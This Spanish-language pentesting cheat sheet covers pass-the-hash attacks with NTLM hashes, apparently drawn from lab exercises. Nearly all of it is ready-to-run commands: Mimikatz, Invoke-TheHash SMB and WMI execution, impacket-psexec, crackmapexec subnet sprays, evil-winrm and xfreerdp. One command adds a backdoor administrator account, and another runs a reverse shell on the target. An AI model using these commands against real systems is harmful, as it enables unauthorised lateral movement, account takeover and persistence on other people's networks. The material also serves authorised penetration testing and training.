Si encontramos un hash NTLM podemos hacer uso del mismo aprovechando las facilidades que ofrecen los SO para correr servicios sin tener que poner la contraseña una y otra vez


### WINDOWS
##### Pass the hash con Mimikatz:
Requerimos:
- Hash NTLM o RC4
- User
- Dominio

    mimikatz.exe privilege::debug "sekurlsa::pth /user:<user> /rc4:<hash> /domain:<dominio o nombre del host> /run:<.exe a ejecutar>" exit

##### PTH con Powershell & Invoke-TheHash:
Target - Hostname or IP address of the target.
Username - Username to use for authentication.
Domain - Domain to use for authentication. This parameter is unnecessary with local accounts or when using the @domain after the username.
Hash - NTLM password hash for authentication. This function will accept either LM:NTLM or NTLM format.
Command - command to run after connection
https://github.com/Kevin-Robertson/Invoke-TheHash
Import-Module .\Invoke-TheHash.psd1

Invoke-SMBExec -Target <ip/hostname> -Domain <domain> -Username <username> -Hash <hash> -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose

Tambien podemos usar revshell para generar una shell reversa y ejecutarla con WMIExec:
creamos la reverse shell:
https://www.revshells.com/:

 Invoke-WMIExec -Target <hostname/ip> -Domain <domain> -Username <username> -Hash <hash> -Command "<reverse_shell_generada>"


################################Linux
#### Impacket:
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453

#####Crackmapexec:
crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453

tambien podemos buscarlo con local accounts:
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +

#####Evil-winRM:
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453

#####RDP:
xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
